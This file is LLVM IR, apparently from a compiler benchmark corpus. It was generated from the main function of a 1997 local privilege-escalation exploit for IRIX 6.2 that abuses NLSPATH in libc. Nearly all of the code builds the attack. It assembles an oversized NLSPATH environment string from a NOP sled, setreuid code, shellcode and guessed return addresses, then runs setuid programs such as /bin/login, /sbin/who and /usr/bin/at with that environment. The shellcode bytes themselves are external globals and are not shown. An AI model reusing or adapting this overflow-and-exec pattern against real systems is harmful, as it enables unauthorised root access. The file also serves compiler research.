; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19551.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19551.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [50 x i8] c"libc.so $NLSPATH for irix 6.2 IP:17,19,20,21,22\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [55 x i8] c"usage: %s {login|who|netprint|ordist|cancel|route|at}\0A\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"login\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"who\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"netprint\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"ordist\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"cancel\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"route\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"at\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [9 x i8] c"NLSPATH=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@setreuidcode = common dso_local global i8** null, align 8
@shellcode = common dso_local global i8** null, align 8
@TMPNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [11 x i8] c"/bin/login\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"/sbin/who\00", align 1
@.str.14 = private unnamed_addr constant [24 x i8] c"/usr/lib/print/netprint\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"/usr/bsd/ordist\00", align 1
@.str.16 = private unnamed_addr constant [16 x i8] c"/usr/bin/cancel\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"/usr/etc/route\00", align 1
@.str.18 = private unnamed_addr constant [4 x i8] c"add\00", align 1
@.str.19 = private unnamed_addr constant [12 x i8] c"/usr/bin/at\00", align 1
@.str.20 = private unnamed_addr constant [4 x i8] c"bzz\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca [2 x i8*], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %12, align 4
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

29:                                               ; preds = %23
  store i32 0, i32* %12, align 4
  br label %30

30:                                               ; preds = %29, %23
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

36:                                               ; preds = %30
  store i32 1, i32* %12, align 4
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %37
  store i32 2, i32* %12, align 4
  br label %44

44:                                               ; preds = %43, %37
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %44
  store i32 3, i32* %12, align 4
  br label %51

51:                                               ; preds = %50, %44
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %51
  store i32 4, i32* %12, align 4
  br label %58

58:                                               ; preds = %57, %51
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* %61, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0))
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

64:                                               ; preds = %58
  store i32 5, i32* %12, align 4
  br label %65

65:                                               ; preds = %64, %58
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %72, label %71

71:                                               ; preds = %65
  store i32 6, i32* %12, align 4
  br label %72

72:                                               ; preds = %71, %65
  %73 = load i32, i32* %12, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %77

75:                                               ; preds = %72
  %76 = call i32 @exit(i32 -1) #3
  unreachable

77:                                               ; preds = %72
  %78 = load i64, i64* @jump, align 8
  %79 = inttoptr i64 %78 to i64 (...)*
  %80 = call i64 (...) %79()
  %81 = add i64 %80, 8492
  %82 = add i64 %81, 1800
  %83 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %84 = bitcast i8* %83 to i64*
  store i64 %82, i64* %84, align 1
  %85 = load i64, i64* @jump, align 8
  %86 = inttoptr i64 %85 to i64 (...)*
  %87 = call i64 (...) %86()
  %88 = add i64 %87, 8492
  %89 = sub i64 %88, 1024
  %90 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %91 = bitcast i8* %90 to i64*
  store i64 %89, i64* %91, align 1
  %92 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %93 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  store i8* %92, i8** %93, align 16
  %94 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 1
  store i8* null, i8** %94, align 8
  %95 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %95, i8** %9, align 8
  %96 = load i8*, i8** %9, align 8
  %97 = call i32 @sprintf(i8* %96, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i64 0, i64 0))
  %98 = load i8*, i8** %9, align 8
  %99 = getelementptr inbounds i8, i8* %98, i64 8
  store i8* %99, i8** %9, align 8
  store i32 0, i32* %11, align 4
  br label %100

100:                                              ; preds = %114, %77
  %101 = load i32, i32* %11, align 4
  %102 = load i32, i32* @NOPNUM, align 4
  %103 = icmp slt i32 %101, %102
  br i1 %103, label %104, label %117

104:                                              ; preds = %100
  %105 = load i32*, i32** @nop, align 8
  %106 = load i32, i32* %11, align 4
  %107 = srem i32 %106, 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i32, i32* %105, i64 %108
  %110 = load i32, i32* %109, align 4
  %111 = trunc i32 %110 to i8
  %112 = load i8*, i8** %9, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %9, align 8
  store i8 %111, i8* %112, align 1
  br label %114

114:                                              ; preds = %104
  %115 = load i32, i32* %11, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %11, align 4
  br label %100

117:                                              ; preds = %100
  store i32 0, i32* %11, align 4
  br label %118

118:                                              ; preds = %132, %117
  %119 = load i32, i32* %11, align 4
  %120 = load i8**, i8*** @setreuidcode, align 8
  %121 = call i32 @strlen(i8** %120)
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %135

123:                                              ; preds = %118
  %124 = load i8**, i8*** @setreuidcode, align 8
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8*, i8** %124, i64 %126
  %128 = load i8*, i8** %127, align 8
  %129 = ptrtoint i8* %128 to i8
  %130 = load i8*, i8** %9, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %9, align 8
  store i8 %129, i8* %130, align 1
  br label %132

132:                                              ; preds = %123
  %133 = load i32, i32* %11, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %11, align 4
  br label %118

135:                                              ; preds = %118
  store i32 0, i32* %11, align 4
  br label %136

136:                                              ; preds = %150, %135
  %137 = load i32, i32* %11, align 4
  %138 = load i8**, i8*** @shellcode, align 8
  %139 = call i32 @strlen(i8** %138)
  %140 = icmp slt i32 %137, %139
  br i1 %140, label %141, label %153

141:                                              ; preds = %136
  %142 = load i8**, i8*** @shellcode, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8*, i8** %142, i64 %144
  %146 = load i8*, i8** %145, align 8
  %147 = ptrtoint i8* %146 to i8
  %148 = load i8*, i8** %9, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %9, align 8
  store i8 %147, i8* %148, align 1
  br label %150

150:                                              ; preds = %141
  %151 = load i32, i32* %11, align 4
  %152 = add nsw i32 %151, 1
  store i32 %152, i32* %11, align 4
  br label %136

153:                                              ; preds = %136
  %154 = load i8*, i8** %9, align 8
  %155 = getelementptr inbounds i8, i8* %154, i32 1
  store i8* %155, i8** %9, align 8
  store i8 -1, i8* %154, align 1
  store i32 0, i32* %11, align 4
  br label %156

156:                                              ; preds = %168, %153
  %157 = load i32, i32* %11, align 4
  %158 = load i32, i32* @TMPNUM, align 4
  %159 = icmp slt i32 %157, %158
  br i1 %159, label %160, label %171

160:                                              ; preds = %156
  %161 = load i32, i32* %11, align 4
  %162 = srem i32 %161, 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %163
  %165 = load i8, i8* %164, align 1
  %166 = load i8*, i8** %9, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %9, align 8
  store i8 %165, i8* %166, align 1
  br label %168

168:                                              ; preds = %160
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %11, align 4
  br label %156

171:                                              ; preds = %156
  store i32 0, i32* %11, align 4
  br label %172

172:                                              ; preds = %184, %171
  %173 = load i32, i32* %11, align 4
  %174 = load i32, i32* @ADRNUM, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %187

176:                                              ; preds = %172
  %177 = load i32, i32* %11, align 4
  %178 = srem i32 %177, 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %179
  %181 = load i8, i8* %180, align 1
  %182 = load i8*, i8** %9, align 8
  %183 = getelementptr inbounds i8, i8* %182, i32 1
  store i8* %183, i8** %9, align 8
  store i8 %181, i8* %182, align 1
  br label %184

184:                                              ; preds = %176
  %185 = load i32, i32* %11, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %11, align 4
  br label %172

187:                                              ; preds = %172
  %188 = load i8*, i8** %9, align 8
  store i8 0, i8* %188, align 1
  %189 = load i32, i32* %12, align 4
  switch i32 %189, label %211 [
    i32 0, label %190
    i32 1, label %193
    i32 2, label %196
    i32 3, label %199
    i32 4, label %202
    i32 5, label %205
    i32 6, label %208
  ]

190:                                              ; preds = %187
  %191 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %192 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* null, i8** %191)
  br label %193

193:                                              ; preds = %187, %190
  %194 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %195 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* null, i8** %194)
  br label %196

196:                                              ; preds = %187, %193
  %197 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %198 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* null, i8** %197)
  br label %199

199:                                              ; preds = %187, %196
  %200 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %201 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* null, i8** %200)
  br label %202

202:                                              ; preds = %187, %199
  %203 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %204 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* null, i8** %203)
  br label %205

205:                                              ; preds = %187, %202
  %206 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %207 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.18, i64 0, i64 0), i8** null, i8** %206)
  br label %208

208:                                              ; preds = %187, %205
  %209 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %210 = call i32 (i8*, i8*, i8*, i8**, ...) @execle(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0), i8** null, i8** %209)
  br label %211

211:                                              ; preds = %208, %187
  %212 = load i32, i32* %3, align 4
  ret i32 %212
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8**, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
